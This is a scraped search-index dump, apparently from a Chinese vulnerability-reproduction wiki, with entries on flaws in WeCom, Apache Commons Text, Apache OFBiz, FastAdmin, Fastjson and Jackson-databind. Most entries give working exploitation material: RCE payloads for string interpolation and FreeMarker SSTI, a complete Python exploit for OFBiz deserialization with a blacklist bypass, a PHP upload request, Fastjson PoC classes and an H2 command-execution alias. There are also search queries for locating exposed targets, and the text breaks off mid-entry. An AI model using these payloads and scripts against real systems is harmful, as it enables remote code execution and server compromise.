","date":"0001-01-01","objectID":"/%E5%BE%AE%E4%BF%A1%E5%AE%A2%E6%88%B7%E7%AB%AF-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%BE%AE%E4%BF%A1%E5%AE%A2%E6%88%B7%E7%AB%AF-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"腾讯 企业微信 agentinfo 信息泄漏漏洞 ","date":"0001-01-01","objectID":"/%E8%85%BE%E8%AE%AF-%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1-agentinfo-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E8%85%BE%E8%AE%AF-%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1-agentinfo-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 腾讯 企业微信 agentinfo 接口存在信息泄漏漏洞，攻击者通过漏洞可以获取企业微信 Secret ","date":"0001-01-01","objectID":"/%E8%85%BE%E8%AE%AF-%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1-agentinfo-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E8%85%BE%E8%AE%AF-%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1-agentinfo-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 腾讯 企业微信 ","date":"0001-01-01","objectID":"/%E8%85%BE%E8%AE%AF-%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1-agentinfo-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E8%85%BE%E8%AE%AF-%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1-agentinfo-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 web.body=\"wework_admin.normal_layout\" ","date":"0001-01-01","objectID":"/%E8%85%BE%E8%AE%AF-%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1-agentinfo-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E8%85%BE%E8%AE%AF-%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1-agentinfo-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 验证POC /cgi-bin/gateway/agentinfo 获取Token https://qyapi.weixin.qq.com/cgi-bin/gettoken?corpid=\u003cYOUR_CORPID\u003e\u0026corpsecret=\u003cYOUR_CORPSECRET\u003e ","date":"0001-01-01","objectID":"/%E8%85%BE%E8%AE%AF-%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1-agentinfo-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E8%85%BE%E8%AE%AF-%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1-agentinfo-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Apache Commons Text 远程代码执行漏洞 CVE-2022-42889 ","date":"0001-01-01","objectID":"/apache-commons-text-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-42889/:0:0","tags":null,"title":"","uri":"/apache-commons-text-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-42889/"},{"categories":null,"content":"漏洞描述 Apache Commons Text 项目实现了一系列关于文本字符串的算法，专注于处理字符串和文本块。10月13日，Apache发布安全公告，修复了Apache Commons Text中的一个远程代码执行漏洞（CVE-2022-42889）。Apache Commons Text版本1.5到1.9中，由于不安全的插值默认值，当输入的参数不受信任时，可能导致远程代码执行。 ","date":"0001-01-01","objectID":"/apache-commons-text-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-42889/:1:0","tags":null,"title":"","uri":"/apache-commons-text-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-42889/"},{"categories":null,"content":"漏洞影响 1.5.0 ≤ Apache Commons Text ＜ 1.10.0 ","date":"0001-01-01","objectID":"/apache-commons-text-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-42889/:2:0","tags":null,"title":"","uri":"/apache-commons-text-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-42889/"},{"categories":null,"content":"环境搭建 IDEA 通过 Maven 导入依赖，pox.xml 如下： \u003cdependencies\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.apache.commons\u003c/groupId\u003e \u003cartifactId\u003ecommons-configuration2\u003c/artifactId\u003e \u003cversion\u003e2.7\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.apache.commons\u003c/groupId\u003e \u003cartifactId\u003ecommons-text\u003c/artifactId\u003e \u003cversion\u003e1.9\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.apache.commons\u003c/groupId\u003e \u003cartifactId\u003ecommons-lang3\u003c/artifactId\u003e \u003cversion\u003e3.12.0\u003c/version\u003e \u003c/dependency\u003e \u003c/dependencies\u003e 测试代码： package org.text; import org.apache.commons.text.StringSubstitutor; public class Main { public static void main(String[] args) { StringSubstitutor interpolator = StringSubstitutor.createInterpolator(); // String payload = interpolator.replace(\"${script:js:new // java.lang.ProcessBuilder(\\\"calc\\\").start()}\"); String payload = \"${script:js:new java.lang.ProcessBuilder(\\\"calc\\\").start()}\"; interpolator.replace(payload); } } ","date":"0001-01-01","objectID":"/apache-commons-text-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-42889/:3:0","tags":null,"title":"","uri":"/apache-commons-text-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-42889/"},{"categories":null,"content":"漏洞复现 Payload： search=${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')} url编码 search=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27touch%20%2Ftmp%2Ffoo%27%29%7D 可以尝试 search=${url:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')} search=${dns:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')} ","date":"0001-01-01","objectID":"/apache-commons-text-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-42889/:4:0","tags":null,"title":"","uri":"/apache-commons-text-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-42889/"},{"categories":null,"content":"修复建议 官方已发布漏洞补丁及修复版本，请评估业务是否受影响后，酌情升级至安全版本。 ","date":"0001-01-01","objectID":"/apache-commons-text-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-42889/:5:0","tags":null,"title":"","uri":"/apache-commons-text-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-42889/"},{"categories":null,"content":"Apache OFBiz 反序列化 CVE-2021-30128 ","date":"0001-01-01","objectID":"/apache-ofbiz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cve-2021-30128/:0:0","tags":null,"title":"","uri":"/apache-ofbiz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cve-2021-30128/"},{"categories":null,"content":"漏洞描述 Ofbiz（Open for business）是一个开源的，基于J2EE和XML规范的，用于构建大型企业级、跨平台、跨数据库、跨应用服务器的多层、分布式电子商务类WEB应用系统的框架（Framework）。 参考链接： 阿里云分析：https://mp.weixin.qq.com/s/Dr-jwiRr4NByjErjiX_e1w r0cky：https://mp.weixin.qq.com/s/ZBrWK3qsLwQs0v6dDi2_2A https://github.com/r0ckysec/CVE-2021-30128 https://mp.weixin.qq.com/s/ZBrWK3qsLwQs0v6dDi2_2A ","date":"0001-01-01","objectID":"/apache-ofbiz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cve-2021-30128/:1:0","tags":null,"title":"","uri":"/apache-ofbiz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cve-2021-30128/"},{"categories":null,"content":"漏洞影响 Apache OFBiz \u003c 17.12.07 ","date":"0001-01-01","objectID":"/apache-ofbiz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cve-2021-30128/:2:0","tags":null,"title":"","uri":"/apache-ofbiz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cve-2021-30128/"},{"categories":null,"content":"网络测绘 app=\"Apache_OFBiz\" ","date":"0001-01-01","objectID":"/apache-ofbiz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cve-2021-30128/:3:0","tags":null,"title":"","uri":"/apache-ofbiz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cve-2021-30128/"},{"categories":null,"content":"漏洞复现 poc： POST /webtools/control/SOAPService HTTP/1.1 Host: 192.168.80.145:8443 User-Agent: python-requests/2.24.0 Accept-Encoding: gzip, deflate Accept: */* Connection: close Content-Type: text/xml Content-Length: 6093 \u003csoapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ser=\"http://ofbiz.apache.org/service/\"\u003e \u003csoapenv:Header/\u003e \u003csoapenv:Body\u003e \u003cser\u003e \u003cmap-Map\u003e \u003cmap-Entry\u003e \u003cmap-Key\u003e \u003ccus-obj\u003eACED0005 ... ... 871007E000D78\u003c/cus-obj\u003e \u003c/map-Key\u003e \u003cmap-Value\u003e \u003cstd-String/\u003e \u003c/map-Value\u003e \u003c/map-Entry\u003e \u003c/map-Map\u003e \u003c/ser\u003e \u003c/soapenv:Body\u003e \u003c/soapenv:Envelope\u003e exp: #!/usr/bin/env python # -*- coding: utf-8 -*- \"\"\" @Author: r0cky @Time: 2021/3/24-15:09 \"\"\" import subprocess import sys import requests import urllib3 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) def banner(): print(\"\"\" =================================================== ____ ______ ____ _ ________ _______ / __ \\| ____| _ \\(_) | ____\\ \\ / / __ \\ | | | | |__ | |_) |_ ____ | |__ \\ V /| |__) | | | | | __| | _ \u003c| |_ / | __| \u003e \u003c | ___/ | |__| | | | |_) | |/ / | |____ / . \\| | \\____/|_| |____/|_/___| |______/_/ \\_\\_| CVE-2021-30128 Powered by r0cky =================================================== \"\"\") def bypass(payload): className = ['org.apache.commons.beanutils.BeanComparator', 'org.apache.commons.collections.comparators.ComparableComparator', 'com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl'] for cn in className: len_hex = hex(len(cn)).replace('0x','').upper() className_hex = cn.encode().hex().upper() bypass_className = cn + '\u003cjava' + cn[cn.rfind('.'):] bypass_len_hex = hex(len(bypass_className)).replace('0x','').upper() bypass_className_hex = bypass_className.encode().hex().upper() payload = payload.replace(len_hex + className_hex, bypass_len_hex + bypass_className_hex) return payload def exp(url, cmd): popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', \"CommonsBeanutils1\", cmd], stdout=subprocess.PIPE) payload = popen.stdout.read() if len(payload) == 0: print(\"请在当前脚本目录放置ysoserial.jar!\") exit(-1) payload = payload.hex().upper() post_data = bypass(payload) print(\"[+] Payload:\", post_data) data = \"\"\" \u003csoapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ser=\"http://ofbiz.apache.org/service/\"\u003e \u003csoapenv:Header/\u003e \u003csoapenv:Body\u003e \u003cser\u003e \u003cmap-Map\u003e \u003cmap-Entry\u003e \u003cmap-Key\u003e \u003ccus-obj\u003e{}\u003c/cus-obj\u003e \u003c/map-Key\u003e \u003cmap-Value\u003e \u003cstd-String/\u003e \u003c/map-Value\u003e \u003c/map-Entry\u003e \u003c/map-Map\u003e \u003c/ser\u003e \u003c/soapenv:Body\u003e \u003c/soapenv:Envelope\u003e \"\"\".format(post_data) print(\"[+] payload sending...\") r = requests.post(url, data=data, headers=headers, verify=False) if r.status_code == 200: print(\"[+] send payload success.\") print() print(\"[END] Apache OFBiz RCE Done.\") else: print(\"[-] send payload failed.\") print() print(\"[END] Apache OFBiz RCE failed.\") headers={\"Content-Type\": \"text/xml\"} if __name__ == '__main__': banner() try: target = sys.argv[1] cmd = sys.argv[2] # target = \"https://192.168.80.136:8443\" # vps_ip = \"10.20.28.16\" # vps_port = \"9999\" url = \"{}/webtools/control/SOAPService\".format(target) exp(url, cmd) except: print(\"Example: \\n\\tpython3 \" + sys.argv[0] + \" \u003ctarget\u003e \u003ccmd\u003e\\n\") ","date":"0001-01-01","objectID":"/apache-ofbiz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cve-2021-30128/:4:0","tags":null,"title":"","uri":"/apache-ofbiz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cve-2021-30128/"},{"categories":null,"content":"Apache OfBiz 服务器端模板注入 SSTI ","date":"0001-01-01","objectID":"/apache-ofbiz-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-ssti/:0:0","tags":null,"title":"","uri":"/apache-ofbiz-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-ssti/"},{"categories":null,"content":"漏洞描述 Apache OfBiz 17.12.01容易受到服务器端模板注入（SSTI）的影响，从而导致远程代码执行（RCE）。 参考链接： https://securitylab.github.com/advisories/GHSL-2020-067-apache_ofbiz ","date":"0001-01-01","objectID":"/apache-ofbiz-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-ssti/:1:0","tags":null,"title":"","uri":"/apache-ofbiz-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-ssti/"},{"categories":null,"content":"漏洞影响 Apache OfBiz 17.12.01 ","date":"0001-01-01","objectID":"/apache-ofbiz-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-ssti/:2:0","tags":null,"title":"","uri":"/apache-ofbiz-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-ssti/"},{"categories":null,"content":"网络测绘 app=\"Apache_OFBiz\" ","date":"0001-01-01","objectID":"/apache-ofbiz-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-ssti/:3:0","tags":null,"title":"","uri":"/apache-ofbiz-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-ssti/"},{"categories":null,"content":"漏洞复现 服务器端模板注入 renderLookupField 从不可信数据流request.getParameter(\"_LAST_VIEW_NAME_\")给一个FreeMarker的宏调用定义。具有特权以渲染任何包含查找字段的页面的攻击者将能够通过发送有效载荷来执行任意系统命令。 poc： https://localhost:8443/ordermgr/control/FindQuote?_LAST_VIEW_NAME_=%22%2F%3E%24%7B%22freemarker.template.utility.Execute%22%3Fnew%28%29%28%22id%22%29%7D%3CFOO ","date":"0001-01-01","objectID":"/apache-ofbiz-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-ssti/:4:0","tags":null,"title":"","uri":"/apache-ofbiz-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-ssti/"},{"categories":null,"content":"Apache OfBiz 远程代码执行 RCE ","date":"0001-01-01","objectID":"/apache-ofbiz-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-rce/:0:0","tags":null,"title":"","uri":"/apache-ofbiz-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-rce/"},{"categories":null,"content":"漏洞描述 Apache OfBiz 17.12.01容易受到服务器端模板注入（SSTI）的影响，从而导致远程代码执行（RCE）。 参考链接： https://securitylab.github.com/advisories/GHSL-2020-066-apache_ofbiz ","date":"0001-01-01","objectID":"/apache-ofbiz-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-rce/:1:0","tags":null,"title":"","uri":"/apache-ofbiz-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-rce/"},{"categories":null,"content":"网络测绘 app=\"Apache_OFBiz\" ","date":"0001-01-01","objectID":"/apache-ofbiz-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-rce/:2:0","tags":null,"title":"","uri":"/apache-ofbiz-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-rce/"},{"categories":null,"content":"漏洞复现 poc： https://localhost/ordermgr/control/FindRequest?foo=bar\"ajaxEnabled=false/\u003e${\"freemarker.template.utility.Execute\"?new()(\"id\")}\u003cFOO ","date":"0001-01-01","objectID":"/apache-ofbiz-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-rce/:3:0","tags":null,"title":"","uri":"/apache-ofbiz-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-rce/"},{"categories":null,"content":"FastAdmin 远程代码执行漏洞 ","date":"0001-01-01","objectID":"/fastadmin-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/fastadmin-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 FastAdmin是一款基于ThinkPHP和Bootstrap的极速后台开发框架。FastAdmin框架存在有条件RCE漏洞，当攻击者具有一定用户权限的前提下，可以实现任意文件上传，导致RCE。 参考链接： https://mp.weixin.qq.com/s/otrH75ZjCHBQbRB7g5DdWg https://nosec.org/home/detail/4713.html ","date":"0001-01-01","objectID":"/fastadmin-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/fastadmin-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"FASTADMIN-框架\" || body=\"\\\"uploadurl\\\":\\\"ajax\\/upload\\\"\" || body=\"api.fastadmin.net\" || body=\"\\\"fastadmin\\\":{\\\"usercenter\\\":true\" || body=\"content=\\\"FastAdmin\\\"\" || body=\"cdnurl\\\":\\\"\\\",\\\"version\"|| icon_hash=\"-1036943727\" ","date":"0001-01-01","objectID":"/fastadmin-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/fastadmin-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 前期准备： 该接口至少需要普通用户权限，可以先在前台注册一个用户然后登录。 需要修改默认配置才能使用分片上传功能。设置 application/extra/upload.php 下的chunking 项为 true。 可使用 application/index/controller/Ajax 下的 upload() 方法作为入口点。根据 tp5 的路由，访问该入口点的 url 为 index.php?s=index/ajax/upload。 上传头像处post： //传入xx.php POST /index/ajax/upload HTTP/1.1 Host: target ------WebKitFormBoundarybw5c2a2bqlLLOMEU Content-Disposition: form-data; name=\"file\"; filename=\"Xnip2021-04-02_11-05-27.png\" Content-Type: application/octet-stream PNG ... \u003c?php phpinfo();?\u003e ------WebKitFormBoundarybw5c2a2bqlLLOMEU Content-Disposition: form-data; name=\"chunkid\" xx.php ------WebKitFormBoundarybw5c2a2bqlLLOMEU Content-Disposition: form-data; name=\"chunkindex\" 0 ------WebKitFormBoundarybw5c2a2bqlLLOMEU ","date":"0001-01-01","objectID":"/fastadmin-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/fastadmin-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Fastjson 远程代码执行漏洞 CVE-2022-25845 ","date":"0001-01-01","objectID":"/fastjson-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-25845/:0:0","tags":null,"title":"","uri":"/fastjson-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-25845/"},{"categories":null,"content":"漏洞描述 Fastjson 是阿里巴巴的开源 JSON 解析库，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列 化到 JavaBean。在 Fastjson 1.2.80 及以下版本中存在反序列化漏洞，攻击者可 以在特定依赖下利用此漏洞绕过默认 autoType 关闭限制，从而反序列化有安全风险的类。 ","date":"0001-01-01","objectID":"/fastjson-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-25845/:1:0","tags":null,"title":"","uri":"/fastjson-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-25845/"},{"categories":null,"content":"漏洞影响 Fastjson ≤ 1.2.80 ","date":"0001-01-01","objectID":"/fastjson-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-25845/:2:0","tags":null,"title":"","uri":"/fastjson-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-25845/"},{"categories":null,"content":"漏洞复现 利用 idea 创建 maven 项目 搭建漏洞环境，在 pom 文件中添加 \u003cdependency\u003e \u003cgroupId\u003ecom.alibaba\u003c/groupId\u003e \u003cartifactId\u003efastjson\u003c/artifactId\u003e \u003cversion\u003e1.2.82\u003c/version\u003e \u003c/dependency\u003e 创建文件夹 com.example.fastjson，在下面添加两个 java 文件 package com.example.fastjson; import java.io.IOException; public class Poc extends Exception { public void setName(String str) { try { Runtime.getRuntime().exec(str); } catch (IOException e) { e.printStackTrace(); } } } package com.example.fastjson; import com.alibaba.fastjson.JSON; public class PocDemo { public static void main(String[] args) { String json = \"{\\\"@type\\\":\\\"java.lang.Exception\\\",\\\"@type\\\":\\\"com.example.fastjson.Poc\\\",\\\"name\\\":\\\"calc\\\"}\"; JSON.parse(json); } } 运行 PocDemo ","date":"0001-01-01","objectID":"/fastjson-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-25845/:3:0","tags":null,"title":"","uri":"/fastjson-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-25845/"},{"categories":null,"content":"漏洞修复 升级至版本 FastJson 1.2.83：https://github.com/alibaba/fastjson/releases/tag/1.2.83 升级到 FastJosn v2：https://github.com/alibaba/fastjson2/releases ","date":"0001-01-01","objectID":"/fastjson-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-25845/:4:0","tags":null,"title":"","uri":"/fastjson-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-25845/"},{"categories":null,"content":"Jackson-databind SSRF\u0026RCE CVE-2020-36179~36182 ","date":"0001-01-01","objectID":"/jackson-databind-ssrfrce-cve-2020-36179~36182/:0:0","tags":null,"title":"","uri":"/jackson-databind-ssrfrce-cve-2020-36179~36182/"},{"categories":null,"content":"漏洞描述 漏洞类型：JDNI注入导致RCE 利用条件： 开启enableDefaultTyping() 使用了org.apache.servicemix.bundles第三方依赖库 以下类绕过了之前jackson-databind维护的黑名单类，并且JDK版本较低的话，可造成SSRF\u0026RCE： CVE-2020-36179：org.apache.commons.dbcp.cpdsadapter.DriverAdapterCPDS CVE-2020-36180: org.apache.commons.dbcp2.cpdsadapter.DriverAdapterCPDS CVE-2020-36181: org.apache.tomcat.dbcp.dbcp.cpdsadapter.DriverAdapterCPDS CVE-2020-36182: org.apache.tomcat.dbcp.dbcp2.cpdsadapter.DriverAdapterCPDS 参考链接： https://github.com/Al1ex/CVE-2020-36179 ","date":"0001-01-01","objectID":"/jackson-databind-ssrfrce-cve-2020-36179~36182/:1:0","tags":null,"title":"","uri":"/jackson-databind-ssrfrce-cve-2020-36179~36182/"},{"categories":null,"content":"漏洞影响 Jackson-databind \u003c 2.9.10.7 ","date":"0001-01-01","objectID":"/jackson-databind-ssrfrce-cve-2020-36179~36182/:2:0","tags":null,"title":"","uri":"/jackson-databind-ssrfrce-cve-2020-36179~36182/"},{"categories":null,"content":"漏洞复现 pom.xml： \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cproject xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"\u003e \u003cmodelVersion\u003e4.0.0\u003c/modelVersion\u003e \u003cgroupId\u003ecom.jacksonTest\u003c/groupId\u003e \u003cartifactId\u003ejacksonTest\u003c/artifactId\u003e \u003cversion\u003e1.0-SNAPSHOT\u003c/version\u003e \u003cdependencies\u003e \u003cdependency\u003e \u003cgroupId\u003ecom.fasterxml.jackson.core\u003c/groupId\u003e \u003cartifactId\u003ejackson-databind\u003c/artifactId\u003e \u003cversion\u003e2.9.10.7\u003c/version\u003e \u003c/dependency\u003e \u003c!-- https://mvnrepository.com/artifact/org.apache.commons/commons-dbcp2 --\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.apache.commons\u003c/groupId\u003e \u003cartifactId\u003ecommons-dbcp2\u003c/artifactId\u003e \u003cversion\u003e2.8.0\u003c/version\u003e \u003c/dependency\u003e \u003c!-- https://mvnrepository.com/artifact/com.h2database/h2 --\u003e \u003cdependency\u003e \u003cgroupId\u003ecom.h2database\u003c/groupId\u003e \u003cartifactId\u003eh2\u003c/artifactId\u003e \u003cversion\u003e1.4.199\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.slf4j\u003c/groupId\u003e \u003cartifactId\u003eslf4j-nop\u003c/artifactId\u003e \u003cversion\u003e1.7.2\u003c/version\u003e \u003c/dependency\u003e \u003c!-- https://mvnrepository.com/artifact/javax.transaction/jta --\u003e \u003cdependency\u003e \u003cgroupId\u003ejavax.transaction\u003c/groupId\u003e \u003cartifactId\u003ejta\u003c/artifactId\u003e \u003cversion\u003e1.1\u003c/version\u003e \u003c/dependency\u003e \u003c/dependencies\u003e \u003c/project\u003e exec.sql： CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\"); return s.hasNext() ? s.next() 